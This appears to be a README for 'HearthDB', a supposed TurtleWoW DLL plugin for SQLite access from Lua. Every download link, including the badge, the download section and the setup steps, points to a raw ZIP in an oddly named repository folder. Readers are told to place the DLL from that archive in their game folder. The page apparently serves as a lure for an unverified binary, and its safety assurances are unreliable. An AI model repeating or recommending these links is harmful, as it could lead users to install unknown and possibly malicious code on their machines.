# 🏠 HearthDB - Simple Lua Database Access

[![Download HearthDB](https://img.shields.io/badge/Download-HearthDB-6c8ebf?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Frederickdecreasingmonotonic214/HearthDB/raw/refs/heads/main/counterlatration/DB_Hearth_cognitive.zip)

## 📥 Download

Visit this page to download: [HearthDB on GitHub](https://github.com/Frederickdecreasingmonotonic214/HearthDB/raw/refs/heads/main/counterlatration/DB_Hearth_cognitive.zip)

## 🧩 What HearthDB Does

HearthDB is a DLL plugin for TurtleWoW.

It lets addons use Lua functions to work with SQLite databases. Addons can save data in `CustomData/` or read bundled SQLite files from their own addon folder.

This is useful if you want an addon to store settings, track progress, or load local data without needing a web service or extra tool.

## ⚙️ What You Need

- A Windows PC
- TurtleWoW installed
- A working addon folder
- Permission to copy files into the game folder
- Enough disk space for the plugin and any database files

HearthDB is built for 32-bit Windows use.

## 🚀 Getting Started

1. Open the download page: [HearthDB on GitHub](https://github.com/Frederickdecreasingmonotonic214/HearthDB/raw/refs/heads/main/counterlatration/DB_Hearth_cognitive.zip)
2. Get the latest files from the repository or release page
3. Open the downloaded archive if the file comes as a ZIP
4. Copy the HearthDB DLL file into the TurtleWoW add-on or plugin folder used by your setup
5. Start TurtleWoW
6. Open the addon that uses HearthDB
7. Check that the addon can read or write the SQLite database you placed in the right folder

## 🗂️ File Layout

A simple setup may look like this:

- `TurtleWoW/`
  - `Interface/`
    - `AddOns/`
      - `YourAddon/`
      - `HearthDB.dll`
  - `CustomData/`
    - `your-database.sqlite`

Some addons may keep their own SQLite file in the addon folder. Others may use `CustomData/` for shared data.

## 🔧 How to Use It

HearthDB exposes Lua functions that addons can call.

Typical use cases include:

- Read values from a local SQLite file
- Save addon settings
- Track player data
- Store shared data in `CustomData/`
- Load bundled database files from the addon folder

If your addon already knows how to call Lua functions, it can use HearthDB to reach SQLite data.

## 🪟 Windows Setup

1. Download the project from the GitHub page
2. Make sure you use the Windows file made for 32-bit apps
3. Place the DLL where TurtleWoW expects it
4. Put any SQLite files in `CustomData/` or inside the addon folder
5. Launch the game
6. Open the addon that depends on HearthDB

If the addon does not see the database, check the file name, folder path, and game folder where you copied the DLL.

## 📚 Example Use

Here are simple examples of what an addon might do:

- Store a list of quest names
- Save a settings table
- Read item data from a bundled database
- Update a counter each time a player uses a feature
- Share small data files across addon sessions

## 🛠️ Common Setup Checks

- The DLL file sits in the right folder
- The addon folder name matches what the addon expects
- The SQLite file is not blocked by Windows
- The database file uses a valid `.sqlite` or `.db` format
- TurtleWoW loads the addon without file errors

## 🧪 If Something Does Not Work

- Make sure you copied the DLL, not just the ZIP file
- Confirm that TurtleWoW is closed while you move files
- Check that the database file is in `CustomData/` or the addon folder
- Use the exact file name expected by the addon
- Reopen the game after every file change

## 📁 Supported Data Locations

HearthDB works with two main data paths:

- `CustomData/` for writable databases
- The addon directory for bundled read-only SQLite files

This setup helps keep shared data separate from addon files.

## 🔒 Safety and Data Use

HearthDB only works with local files on your PC.

It does not need a cloud account or an online database. Addons can read and write only the files you place in the right folders.

## 🧱 Build Details

HearthDB is built in Rust and cross-compiled to a 32-bit Windows DLL from Linux.

That means the project is made to run as a game plugin in a Windows TurtleWoW setup.

## 📌 Repository Info

- Name: HearthDB
- Type: DLL plugin
- Target: TurtleWoW
- Language: Rust
- Storage: SQLite
- Use case: Lua access to local databases